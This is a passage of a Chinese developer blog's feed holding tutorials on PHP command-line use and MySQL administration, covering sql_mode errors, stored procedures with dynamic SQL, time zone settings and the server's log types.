class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt;echo &quot;Hello PHP&quot;;</span><br><span class="line">Hello PHP</span><br><span class="line">php &gt; echo 10+90;</span><br><span class="line">100</span><br></pre></td></tr></table></figure><p>回车即可查看输出内容。</p><h4 id="Interactive-mode-enabled"><a href="#Interactive-mode-enabled" class="headerlink" title="Interactive mode enabled"></a>Interactive mode enabled</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt;echo &quot;Hello PHP&quot;;</span><br></pre></td></tr></table></figure><p>如果出现的是这个模式，说明你的PHP并不支持交互式shell，</p><p>不过不用担心，这个模式同样也可以执行PHP 代码，只是代码的执行方式有些区别。</p><p>输入了所有PHP代码后，输入<code>Ctrl-Z</code>（windows里），或输入<code>Ctrl-D</code>（linux里），你输入的所有代码将会一次执行完成并输出结果。</p><p>输入<code>exit</code>或者<code>⌃ + c</code> 退出交互模式。</p><h3 id="PHP-脚本"><a href="#PHP-脚本" class="headerlink" title="PHP 脚本"></a>PHP 脚本</h3><p>在终端中可以把PHP 脚本作为Shell 脚本来运行。</p><p>首先你需要创建一个PHP 脚本文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo -e &#39;#!&#x2F;usr&#x2F;bin&#x2F;php\n&lt;?php phpinfo();?&gt;&#39; &gt; phpscript.php</span><br></pre></td></tr></table></figure><p><code>-e</code> 表示激活转义字符。</p><p>注意，这个脚本文件中的第一行<code>#!/usr/bin/php</code>，就像是Shell 脚本中的<code>#!/bin/bash</code>。目的是告诉Linux 命令行使用PHP 解析器来解析该文件。</p><p>运行该脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># chmod +x phpscript.php  &#x2F;&#x2F; 使脚本具有执行权限</span><br><span class="line"># .&#x2F;phpscript.php   &#x2F;&#x2F;执行脚本</span><br></pre></td></tr></table></figure><h3 id="PHP-服务"><a href="#PHP-服务" class="headerlink" title="PHP 服务"></a>PHP 服务</h3><p>PHP 有内置一个WebServer，可以很方便快速的搭建一个PHP 服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ php -t &#x2F;project to path -S localhost:port</span><br></pre></td></tr></table></figure><p>然后通过浏览器访问<code>localhost:port</code> 就可以了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><code>php -a</code>：进入交互模式</li><li><code>php -f</code>：解析和执行文件</li><li><code>php -h</code>：获取帮助</li><li><code>php -i</code>：查看PHP 信息和配置</li><li><code>php -m</code>：显示已经安装的模块</li><li><code>php -r</code>：运行PHP代码不使用脚本标签’<?..?>‘</li><li><code>php -v</code>：查看PHP 版本</li><li><code>php -ini</code>：查看加载配置文件（php.ini、conf.d）</li><li><code>php -i | grep configure</code>：查看静态编译模块</li><li><code>php --ri swoole</code>：查看指定模块的配置</li><li><code>locate php.ini</code>：查询本地配置文件</li><li><code>time php script.php</code>：查看程序的执行时间</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linux.cn/article-5906-1.html" target="_blank" rel="noopener">在 Linux 命令行中执行和使用 PHP 代码</a></li><li><a href="https://www.tecmint.com/execute-php-codes-functions-in-linux-commandline/" target="_blank" rel="noopener">12 个 Linux 终端中有用的 PHP 命令行用法</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>如何解决“ORDER BY子句不在SELECT列表中”的问题</title>
    <link href="https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/"/>
    <id>https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/</id>
    <published>2020-07-28T00:29:37.000Z</published>
    <updated>2020-07-28T15:28:10.444Z</updated>
    
    <content type="html"><![CDATA[<p>记录一个最近遇到的Mysql 问题。</p><a id="more"></a><blockquote><p>问题描述：<br>在本地项目中，部分SQL 语句执行起来，总是会报一个错。<br>而同样的SQL，在线上的服务器中执行起来没有任何问题。</p></blockquote><p>错误提示内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;foodorder.orderlist.cname&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by QMYSQL: Unable to execute query</span><br></pre></td></tr></table></figure><p>我的第一反应就是检查Mysql 的版本，很巧的是本地Mysql<br>的版本确实比服务器的版本低一些。很快我就想到一定是版本存在差异性，导致语法不兼容。</p><h2 id="升级Mysql"><a href="#升级Mysql" class="headerlink" title="升级Mysql"></a>升级Mysql</h2><p>既然是版本不一的问题，那就升级本地的Mysql 好了。</p><p>因为我的Mysql 是之前通过Homebrew 安装的，所以如需要升级，根本不用我自己手动去寻找安装包，直接通过Homebrew 的Upgrade 命令自动升级就好了。</p><p>起初我还担心自动升级会不会把我的Mysql 的版本更新的<code>5.7</code>以上，后来证明是我想多了。</p><p>不过在正式更新之前需要做好以下几件事情：</p><ul><li>对数据库做好必要的备份</li><li>停止本地Mysql 服务</li><li>确定所要更新的Mysql 版本</li></ul><p>做好以上三件事之后，就可以开始升级了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ brew search mysql</span><br><span class="line">mysql@5.7 ✔</span><br><span class="line">$ brew upgrade mysql@5.7</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>终于安装好之后，再次开启Mysql 的服务，我发现还是没有解决我的问题，还是会提示相同的错误。</p><p>这时候我才意识到这个问题和Mysql 的版本没有关系，有关系应该是相关的模块。</p><p>通过查阅一番资料，才发现是因为 <code>group by</code> 中的列一定要出现在 <code>select</code> 中，除非强制 <code>sqlmode</code> 中使用 <code>ONLY_FULL_GROUP_BY</code>。</p><h2 id="开启sql-mode-模式"><a href="#开启sql-mode-模式" class="headerlink" title="开启sql-mode 模式"></a>开启sql-mode 模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf</span><br><span class="line"></span><br><span class="line"># 增加如下内容</span><br><span class="line">[mysqld]</span><br><span class="line">sql_mode&#x3D;&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line">[mysqld]</span><br><span class="line">sql_mode &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure><p>重启Mysql 服务器，即可。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/36829911/how-to-resolve-order-by-clause-is-not-in-select-list-caused-mysql-5-7-with-sel/39353160" target="_blank" rel="noopener"> 如何解决 MySQL 5.7带有SELECT DISTINCT和ORDER BY的问题 | stack voerflow </a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html" target="_blank" rel="noopener">Mysql 服务器SQL 模式</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一个最近遇到的Mysql 问题。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 存储过程入门</title>
    <link href="https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/"/>
    <id>https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/</id>
    <published>2020-07-27T15:50:50.000Z</published>
    <updated>2020-07-27T15:51:55.775Z</updated>
    
    <content type="html"><![CDATA[<p>最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。</p><p>应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。</p><a id="more"></a><p>以下两点是其中比较重要的部分：</p><ol><li>关于变量的使用</li><li>在存储过程中使用动态SQL 语句</li></ol><h2 id="存储过程中的变量"><a href="#存储过程中的变量" class="headerlink" title="存储过程中的变量"></a>存储过程中的变量</h2><p>MySQL存储过程常见的变量：局部变量、用户变量、系统变量。</p><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>在过程体中，可以声明局部变量，用来临时保存一些值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE  var_name[, var_name] ...  type [DEFAULT value];</span><br></pre></td></tr></table></figure><p>其中，type为MySQL的数据类型，如:int、float、date、varchar(length) 。</p><p>使用局部变量时，需要注意以下两点：</p><ol><li>DECLARE用来声明局部变量，且DECLARE仅被用在BEGIN … END复合语句里，并且必须在复合语句的开头，在任何其它语句之前；可以被用在嵌套的块中，除了那些用相同名字声明变量的块。</li><li>如果要给变量提供一个默认值，使用DEFAULT子句(值可以是常数，也可以指定为一个表达式)；如果没有DEFAULT子句，初始值为NULL。</li></ol><h3 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h3><p>用户变量与数据库连接有关：在当前连接中声明的变量，在连接断开的时候，就会消失；在此连接中声明的变量无法在另一连接中使用。</p><p>用户变量使用<code>@</code>关键字去定义。</p><h2 id="在存储过程中动态执行SQL"><a href="#在存储过程中动态执行SQL" class="headerlink" title="在存储过程中动态执行SQL"></a>在存储过程中动态执行SQL</h2><p>其实这个理解成一套模版，只要按照标准去执行这套模版，就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">-- 连接数据库</span><br><span class="line">use databaseName;</span><br><span class="line">-- 定义结束符为 $$</span><br><span class="line">delimiter $$</span><br><span class="line">-- 判断是否存在该名称的存储过程，如果存在就删除</span><br><span class="line">drop procedure if exists wk;</span><br><span class="line">-- 创建新的存储过程</span><br><span class="line">create procedure wk()</span><br><span class="line">begin</span><br><span class="line">        -- 声明变量</span><br><span class="line">        declare days int default 366;</span><br><span class="line">        declare dates int;</span><br><span class="line">-- 循环体</span><br><span class="line">WHILE days - 1 &gt; 0 DO</span><br><span class="line">        -- 为变量赋值</span><br><span class="line">    SET dates &#x3D; DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL dayofyear(now())- days DAY), &quot;%Y%m%d&quot;);</span><br><span class="line">SET days &#x3D; days - 1;</span><br><span class="line">-- 拼接表名</span><br><span class="line">set @table_name &#x3D; CONCAT(&quot;tableName&quot;, dates);</span><br><span class="line">        -- 拼接需要执行SQL 语句，后面的内容需要根据实际情况替换掉</span><br><span class="line">        SET @sql &#x3D; CONCAT(&quot;ALTER TABLE &quot;, @table_name, &quot;</span><br><span class="line">          -- 需要执行的SQL </span><br><span class="line">          &quot;);</span><br><span class="line">        -- 预处理动态SQL 语句，其中stmt 是一个变量</span><br><span class="line">        PREPARE stmt FROM @sql;</span><br><span class="line">        -- 执行SQL 语句</span><br><span class="line">        EXECUTE stmt ;</span><br><span class="line">        -- 释放prepare</span><br><span class="line">        deallocate prepare stmt;</span><br><span class="line">-- 结束循环</span><br><span class="line">end WHILE;</span><br><span class="line">-- 结束定义语句</span><br><span class="line">end $$</span><br><span class="line">delimiter ;</span><br><span class="line">call wk();</span><br></pre></td></tr></table></figure><p>大致上就是这样，至此，一个完整的Mysql 存储过程就完成了。</p><blockquote><p>如何在终端执行Mysql 文件？</p></blockquote><p>SQL 脚本准备好了，有两种方式可以执行它。</p><ol><li>方式一：不进入Mysql 终端，直接在命令行终端执行</li><li>方式二：进入Mysql 终端，在Mysql 终端中执行</li></ol><p>这两种方式的共同点就是都需要已知Mysql 密码。</p><p>对于方式一，可以使用以下命令来执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p &lt; .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><p>可以指定数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p databaseName &lt; .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><p>对于方式二，可以使用以下命令来执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 进入Mysql 终端</span><br><span class="line">mysql -uroot -p </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 执行SQL 文件</span><br><span class="line">source .&#x2F;modify_user_table.sql</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://pein0119.github.io/2014/10/22/MySQL%E7%BB%88%E7%AB%AF%E6%89%A7%E8%A1%8CSQL%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">Mysql 终端执行SQL 文件</a></li><li><a href="https://www.cnblogs.com/geaozhang/p/6803423.html" target="_blank" rel="noopener">Mysql 存储过程中的变量定义</a></li><li><a href="https://www.cnblogs.com/easonjim/p/7966918.html" target="_blank" rel="noopener">Mysql 中的变量定义和赋值</a></li><li><a href="https://my.oschina.net/u/2331760/blog/3065637" target="_blank" rel="noopener">Mysql 存储过程中使用动态SQL 语句</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。&lt;/p&gt;
&lt;p&gt;应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 查看修改默认时区</title>
    <link href="https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/"/>
    <id>https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/</id>
    <published>2020-07-25T15:43:57.000Z</published>
    <updated>2020-07-25T15:45:03.233Z</updated>
    
    <content type="html"><![CDATA[<p>在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。</p><p>这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。</p><a id="more"></a><h3 id="查看默认时区"><a href="#查看默认时区" class="headerlink" title="查看默认时区"></a>查看默认时区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%time_zone%&quot;;</span><br><span class="line">+------------------+--------+</span><br><span class="line">| Variable_name    | Value  |</span><br><span class="line">+------------------+--------+</span><br><span class="line">| system_time_zone | CST    |</span><br><span class="line">| time_zone        | SYSTEM |</span><br><span class="line">+------------------+--------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><h3 id="设置默认时区"><a href="#设置默认时区" class="headerlink" title="设置默认时区"></a>设置默认时区</h3><h4 id="设置当前会话"><a href="#设置当前会话" class="headerlink" title="设置当前会话"></a>设置当前会话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET time_zone &#x3D; &quot;+8.00&quot;;</span><br><span class="line">mysql&gt; show variables like &quot;%time_zone%&quot;;</span><br></pre></td></tr></table></figure><p>此修改只会对当前会话有效。</p><h4 id="全局设置"><a href="#全局设置" class="headerlink" title="全局设置"></a>全局设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET global time_zone &#x3D; &quot;+8.00&quot;;</span><br></pre></td></tr></table></figure><p>需要重启该会话，该配置才生效。</p><h4 id="编辑-my-ini"><a href="#编辑-my-ini" class="headerlink" title="编辑 my.ini"></a>编辑 my.ini</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 打开Mysql 的配置文件 my.ini</span><br><span class="line">[mysqld]</span><br><span class="line">default-time_zone &#x3D; &#39;+8:00&#39;</span><br></pre></td></tr></table></figure><p>需要重启Mysql 服务</p><h5 id="时间格式"><a href="#时间格式" class="headerlink" title="时间格式"></a>时间格式</h5><p>GMT（Greenwich Mean Time）：格林威治标准时间<br>UTC：世界标准时间<br>CST（China Standard Time）：中国标准时间</p><p>GMT + 8 = UTC + 8 = CST</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://majing.io/posts/10000004161181" target="_blank" rel="noopener">Mysql 查看修改时区 time_zone</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在之前的笔记中，我们知道了时区相关的概念，以及如何在PHP 获取设置默认时区。&lt;/p&gt;
&lt;p&gt;这篇笔记就来学习一下如何在Mysql 上获取设置默认时区。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>了解 Mysql 日志</title>
    <link href="https://www.0x2beace.com/understanding-the-mysql-log/"/>
    <id>https://www.0x2beace.com/understanding-the-mysql-log/</id>
    <published>2020-07-25T15:38:53.000Z</published>
    <updated>2020-07-31T12:39:49.199Z</updated>
    
    <content type="html"><![CDATA[<p>日志无论在哪里都是尤为重要的存在，所以这篇笔记的目的就是了解Mysql 日志的。</p><a id="more"></a><h2 id="日志简介"><a href="#日志简介" class="headerlink" title="日志简介"></a>日志简介</h2><p>Mysql 的日志主要分为四类，使用这些日志文件，可以查看Mysql 内部发生的事情，这四类日志分别是：</p><ul><li>错误日志：记录Mysql 服务的启动、运行或停止Mysql服务时出现的问题。</li><li>查询日志：记录建立的客户端连接和执行的语句。</li><li>二进制日志：记录所有更改数据的语句，可以用于数据恢复。</li><li>慢查询日志：记录所有执行时间超过 long_query_time 的所有查询或不使用索引的查询。</li></ul><h3 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h3><p>二进制日志主要记录 Mysql 数据库的变化。二进制日志以一种有效的格式，并且是事务安全的方式包含更新日志中可用的所有信息。</p><h4 id="启动和设置二进制日志"><a href="#启动和设置二进制日志" class="headerlink" title="启动和设置二进制日志"></a>启动和设置二进制日志</h4><p>默认情况下，二进制日志是关闭的，可以通过修改mysql 的配置文件来启动和设置二进制日志。</p><p>配置文件 my.ini 中有几个设置是关于二进制日志的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 如果需要启用，就在 mysqld 组下，加上 log-bin 选项</span><br><span class="line">[mysqld]</span><br><span class="line">log-bin</span><br><span class="line"></span><br><span class="line">log-bin [&#x3D;path&#x2F; [filename] ]</span><br><span class="line">expire_logs_days &#x3D; 10</span><br><span class="line">max_binlog_size &#x3D; 100M</span><br></pre></td></tr></table></figure><ol><li><code>log-bin</code>定义开启二进制日志，path 表示日志文件所在的目录路径，filename 指定了日志文件的名称。</li><li><code>expire_logs_days</code>定义了Mysql 清除过期日志的时间，即二进制日至的自动删除的天数。</li><li><code>max_binlog_size</code>定义了单个文件的大小限制，不能将变量设置为大于1GB或者小于4096B。默认值为1GB.</li></ol><blockquote><p>如何检查自己的二进制日志是否开启了呢？</p></blockquote><p>输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;log_%&#39;;</span><br></pre></td></tr></table></figure><h4 id="查看二进制日志"><a href="#查看二进制日志" class="headerlink" title="查看二进制日志"></a>查看二进制日志</h4><p>查看二进制文件个数及文件名，前提是开启了二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show binary logs;</span><br></pre></td></tr></table></figure><h4 id="删除二进制日志"><a href="#删除二进制日志" class="headerlink" title="删除二进制日志"></a>删除二进制日志</h4><p>Mysql 也为我们提供了删除二进制日志的方法，有两种，作用不相同。</p><p>删除所有二进制日志文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; RESET MASTER;</span><br></pre></td></tr></table></figure><p>删除指定二进制日志文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 其中，binlog.000003 是指二进制文件的名称</span><br><span class="line">mysql&gt; PURGE MASTER LOGS TO &quot;binlog.000003&quot;;</span><br></pre></td></tr></table></figure><h4 id="使用二进制日志恢复数据库"><a href="#使用二进制日志恢复数据库" class="headerlink" title="使用二进制日志恢复数据库"></a>使用二进制日志恢复数据库</h4><p>如果启用了Mysql 的二进制日志，在数据库出现意外丢失数据时，可以使用 Mysqlbinlog 工具从指定时间点开始（例如，最后一次备份）直到现在。</p><p>Mysqlbinlog 恢复数据库的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysqlbinlog [option] filename | mysql -uuser -ppass</span><br></pre></td></tr></table></figure><p>实例：使用Mysqlbinlog 恢复Mysql 数据库到2019年1月30日15:27:48时的状态，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlbinlog --stop--date&#x3D;&quot;2019-01-30 15:27:48&quot; | path&#x2F;binlogfilename -uuser -ppass</span><br></pre></td></tr></table></figure><h4 id="暂停二进制日志功能"><a href="#暂停二进制日志功能" class="headerlink" title="暂停二进制日志功能"></a>暂停二进制日志功能</h4><p>因为修改Mysql 配置文件可以启用、停用二进制日志功能，但是需要重启Mysql 服务器。Mysql 为我们提供了一种更简单的方式可以暂停记录二进制日志。</p><p>暂停记录二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET sql_log_bin &#x3D; 0;</span><br></pre></td></tr></table></figure><p>恢复记录二进制日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET sql_log_bin &#x3D; 1;</span><br></pre></td></tr></table></figure><h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h3><p>错误日志文件包含了当Mysqld 启动和停止时，以及服务器在运行过程中发生任何严重错误时的相关信息。错误日志默认是开启的。</p><h4 id="启动和设置错误日志"><a href="#启动和设置错误日志" class="headerlink" title="启动和设置错误日志"></a>启动和设置错误日志</h4><p>通过修改my.ini 配置文件，来启用或者停用错误日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 如果需要启用，就在 mysqld 组下，加上 log-error 选项</span><br><span class="line">[mysqld]</span><br><span class="line">log-error</span><br><span class="line"></span><br><span class="line">log-error&#x3D;[path&#x2F;filename]</span><br></pre></td></tr></table></figure><h4 id="查看错误日志"><a href="#查看错误日志" class="headerlink" title="查看错误日志"></a>查看错误日志</h4><p>首先使用如下命令查看错误日志的存储路径以及文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;log_error&#39;;</span><br></pre></td></tr></table></figure><h4 id="删除错误日志文件"><a href="#删除错误日志文件" class="headerlink" title="删除错误日志文件"></a>删除错误日志文件</h4><p>Mysql 的错误日志文件是以文本文件的形式存储在文件系统中，可以直接删除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; flush logs;</span><br></pre></td></tr></table></figure><h3 id="通用查询日志"><a href="#通用查询日志" class="headerlink" title="通用查询日志"></a>通用查询日志</h3><p>通用查询日志记录了Mysql 的所有操作，包括启动和关闭服务、执行查询和更新语句等。</p><h4 id="启用和设置通用查询日志"><a href="#启用和设置通用查询日志" class="headerlink" title="启用和设置通用查询日志"></a>启用和设置通用查询日志</h4><p>同样的，打开Mysql 的my.ini 配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log</span><br><span class="line"></span><br><span class="line">log&#x3D;[path\filename]</span><br></pre></td></tr></table></figure><p>这里有两种方式，log 选项后面如果没有带任何参数表示使用Mysql 默认的存储位置，上面的也一样。</p><h4 id="查看通用查询日志"><a href="#查看通用查询日志" class="headerlink" title="查看通用查询日志"></a>查看通用查询日志</h4><p>可以通过log 设置的日志文件存储路径，去查看具体文件。</p><h3 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h3><p>慢查询日志记录查询时长超过指定时间的日志。通过慢查询日志，可以找出执行时间较长、执行效率较低的语句，然后进行优化。</p><h4 id="启用和设置慢查询日志"><a href="#启用和设置慢查询日志" class="headerlink" title="启用和设置慢查询日志"></a>启用和设置慢查询日志</h4><p>同样的，打开编辑Mysql 的my.ini 配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-slow-queries</span><br><span class="line"></span><br><span class="line">log-slow-queries&#x3D;[path\filename]</span><br><span class="line">long_query_time&#x3D;n</span><br></pre></td></tr></table></figure><p>n 表示查询时间的极限值，如果超过了这个值，这个查询过程就会被记录到慢查询日志文件中。</p><p>查询慢查询日志同上。</p><p>上面这些日志配置的更改都需要重启服务器才能生效，另外还有一种方式可以查看运行时日志。</p><h3 id="启用实时日志"><a href="#启用实时日志" class="headerlink" title="启用实时日志"></a>启用实时日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 查看日志文件目录</span><br><span class="line">show variables like &#39;general_log_file&#39;;</span><br></pre></td></tr></table></figure><p>这种方式的好处就是不需要重启Mysql 服务。</p><p>如果需要禁用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; off;</span><br></pre></td></tr></table></figure><blockquote><p>关于平时应该打开哪些日志的问题。</p></blockquote><p>日志的开启既会影响Mysql 